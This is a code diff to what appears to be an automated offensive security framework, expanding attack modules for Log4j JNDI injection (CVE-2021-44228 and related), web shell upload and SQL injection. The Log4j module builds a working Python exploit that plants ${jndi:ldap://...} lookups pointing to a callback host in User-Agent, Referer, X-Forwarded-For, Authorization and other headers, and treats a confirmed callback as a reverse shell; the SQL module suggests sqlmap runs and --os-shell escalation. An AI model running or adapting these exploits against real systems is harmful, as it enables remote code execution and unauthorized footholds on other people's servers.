@@ -10,7 +10,16 @@ class Log4jRCE(AttackModule):
     description = "Log4j JNDI injection RCE (CVE-2021-44228)"
     target_services = ["http", "https"]
     target_ports = [8080, 8443, 80, 443]
-    required_cves = ["CVE-2021-44228"]
+    required_cves = ["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105", "CVE-2021-44832"]
+    # Phase 3: version-gated -- Log4j 2.0-beta9 through 2.14.1 (2.15.0 still
+    # vulnerable to CVE-2021-45046).
+    target_versions = {
+        "http": ["log4j 2.0", "log4j 2.1", "log4j 2.2", "log4j 2.3", "log4j 2.4",
+                 "log4j 2.5", "log4j 2.6", "log4j 2.7", "log4j 2.8", "log4j 2.9",
+                 "log4j 2.10", "log4j 2.11", "log4j 2.12", "log4j 2.13", "log4j 2.14",
+                 "log4j 2.15"],
+        "https": ["log4j 2.0", "log4j 2.14", "log4j 2.15"],
+    }
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
         script = self.generate_python_script(ctx)
@@ -18,7 +27,21 @@ class Log4jRCE(AttackModule):
             "status": "script_generated",
             "module": self.name,
             "script": script,
-            "note": "Inject ${jndi:ldap://attacker:1389/a} into any HTTP header or parameter.",
+            "note": (
+                "Inject ${jndi:ldap://<callback>:1389/a} into any HTTP header or "
+                "parameter. Callback host must be in exploit.allowed_targets. "
+                "On callback confirmation the orchestrator sets shell_type=reverse."
+            ),
+            # Phase 3: this recipe represents a real compromise path -- declare
+            # the intent signals so record_success can act on a confirmed
+            # callback (the dispatch classifier fills evidence).
+            "shell_type": "reverse",
+            "privilege_level": "user",
+            "evidence": [f"Log4j JNDI payloads queued against {ctx.target_ip}"],
+            "references": [
+                "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+                "https://www.lunasec.io/docs/blog/log4j-zero-day/",
+            ],
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
@@ -28,9 +51,19 @@ class Log4jRCE(AttackModule):
 # Usage: python log4j_poc.py <target_host> <target_port>
 host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
 port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
-payload = b"GET / HTTP/1.1\\r\\n"
+# Phase 3: inject into MULTIPLE headers (User-Agent, Referer, X-Forwarded-For,
+# X-Api-Version, Authorization, Host) + query params -- the old script only
+# covered X-Api-Version. Callback host is a placeholder the operator replaces
+# with their allowlisted listener.
+CALLBACK_HOST = "<CALLBACK_HOST>"
+CALLBACK_PORT = "1389"
+payload = b"GET /?q=${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}} HTTP/1.1\\r\\n"
 payload += b"Host: " + host.encode() + b"\\r\\n"
-payload += b"X-Api-Version: ${{jndi:ldap://" + host.encode() + b":1389/a}}\\r\\n\\r\\n"
+payload += b"User-Agent: ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n"
+payload += b"Referer: ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n"
+payload += b"X-Forwarded-For: ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n"
+payload += b"X-Api-Version: ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n"
+payload += b"Authorization: Bearer ${{jndi:ldap://" + CALLBACK_HOST.encode() + b":" + CALLBACK_PORT.encode() + b"/a}}\\r\\n\\r\\n"
 s = socket.socket()
 s.connect((host, port))
 s.send(payload)
@@ -118,7 +151,18 @@ class WebShellUpload(AttackModule):
             "status": "script_generated",
             "module": self.name,
             "script": script,
-            "note": "Attempts to upload web shells with various extensions and bypasses.",
+            "note": (
+                "Attempts to upload web shells with various extensions and bypasses. "
+                "On WEBSHELL_CONFIRMED the orchestrator sets shell_type=webshell."
+            ),
+            # Phase 3: a successful upload is a real foothold path.
+            "shell_type": "webshell",
+            "privilege_level": "user",
+            "evidence": [f"webshell upload attempts queued against {ctx.target_ip}"],
+            "references": [
+                "https://owasp.org/www-community/attacks/Unrestricted_File_Upload",
+                "https://book.hacktricks.wiki/en/pentesting-web/file-upload.html",
+            ],
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
@@ -165,17 +209,29 @@ class SQLInjection(AttackModule):
     name = "SQLInjection"
     description = "Automated SQL injection testing with sqlmap integration"
     target_services = ["http", "https"]
-    target_ports = [80, 443, 8080, 8443, 3000, 5000]
+    target_ports = [80, 443, 8080, 8443, 3000, 5000, 8000, 8888]
     required_cves = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Use sqlmap for comprehensive SQL injection testing.",
-            "suggested_command": f"sqlmap -u 'http://{ctx.target_ip}/page.php?id=1' --batch --level=3 --risk=2",
-            "techniques": ["union", "error", "time", "stacked"],
-        }
+        return self._info_result(
+            ctx,
+            note=(
+                "Use sqlmap for comprehensive SQL injection testing. "
+                "sqlmap is Linux-attacker only; on Windows use the urllib-based "
+                "blind-SQLi probe script. --os-shell / --file-write escalate to "
+                "a webshell foothold."
+            ),
+            evidence=[f"SQLi testing planned against {ctx.target_ip}"],
+            references=[
+                "https://sqlmap.org",
+                "https://owasp.org/www-community/attacks/SQL_Injection",
+            ],
+            suggested_command=(
+                f"sqlmap -u 'http://{ctx.target_ip}/page.php?id=1' --batch --crawl=2 "
+                f"--forms --level=3 --risk=2"
+            ),
+            techniques=["union", "error", "time", "stacked"],
+        )
 
 class XSSScanner(AttackModule):
     name = "XSSScanner"
